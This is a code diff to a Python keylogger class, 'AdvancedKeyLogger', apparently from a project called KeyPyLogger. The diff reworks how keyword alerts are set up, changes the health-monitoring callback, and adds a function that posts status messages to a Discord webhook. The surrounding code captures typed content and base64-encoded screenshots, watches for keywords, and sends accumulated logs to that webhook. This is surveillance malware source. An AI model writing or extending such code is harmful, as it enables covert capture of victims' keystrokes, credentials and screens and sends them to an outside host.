@@ -148,15 +148,17 @@ class AdvancedKeyLogger:
         # Initialize keyword alerts
         if ENABLE_KEYWORD_ALERTS:
             try:
-                self.keyword_alerts = KeywordAlertSystem(
-                    callback=self._on_keyword_detected
-                )
-
-                # Load preset lists
+                # Collect keywords from preset lists
+                all_keywords = []
                 for list_name in KEYWORD_LISTS:
                     if hasattr(PresetKeywordLists, list_name.upper()):
                         keywords = getattr(PresetKeywordLists, list_name.upper())
-                        self.keyword_alerts.add_keywords(keywords)
+                        all_keywords.extend(keywords)
+
+                self.keyword_alerts = KeywordAlertSystem(
+                    keywords=all_keywords,
+                    alert_callback=self._on_keyword_detected
+                )
 
                 print("[+] Keyword alerts initialized")
             except Exception as e:
@@ -175,8 +177,8 @@ class AdvancedKeyLogger:
         if ENABLE_HEALTH_MONITORING:
             try:
                 self.health_checker = HealthChecker(
-                    check_interval=300,
-                    webhook_url=self.webhook_url
+                    callback=self._on_health_update,
+                    check_interval=300
                 )
                 self.health_checker.start()
                 print("[+] Health monitoring started")
@@ -235,20 +237,38 @@ class AdvancedKeyLogger:
             "content": content[:500]  # Limit content size
         })
 
-    def _on_screenshot_taken(self, timestamp, image_data):
+    def _on_screenshot_taken(self, timestamp, image_data, size=None):
         """Callback for screenshot capture"""
         self.screenshot_buffer.append({
             "timestamp": timestamp,
             "image": base64.b64encode(image_data).decode('utf-8')[:50000]  # Limit size
         })
 
-    def _on_keyword_detected(self, keyword, context):
+    def _on_keyword_detected(self, keyword, context, timestamp=None):
         """Callback for keyword detection"""
         self.keyword_alerts_buffer.append({
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "timestamp": timestamp or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             "keyword": keyword,
             "context": context[:200]
         })
+
+    def _on_health_update(self, health_info):
+        """Callback for health monitoring updates"""
+        try:
+            embed = {
+                "title": "💚 Health Status",
+                "color": 3066993,
+                "fields": [
+                    {"name": "CPU Usage", "value": f"{health_info.get('cpu_percent', 0):.1f}%", "inline": True},
+                    {"name": "Memory", "value": f"{health_info.get('memory_mb', 0):.1f} MB", "inline": True},
+                    {"name": "Uptime", "value": f"{health_info.get('uptime_seconds', 0):.0f}s", "inline": True},
+                ],
+                "timestamp": datetime.now(timezone.utc).isoformat()
+            }
+            payload = {"username": "KeyPyLogger Health", "embeds": [embed]}
+            requests.post(self.webhook_url, json=payload, timeout=10)
+        except:
+            pass
 
     def _send_logs(self):
         """Send accumulated logs to Discord webhook"""
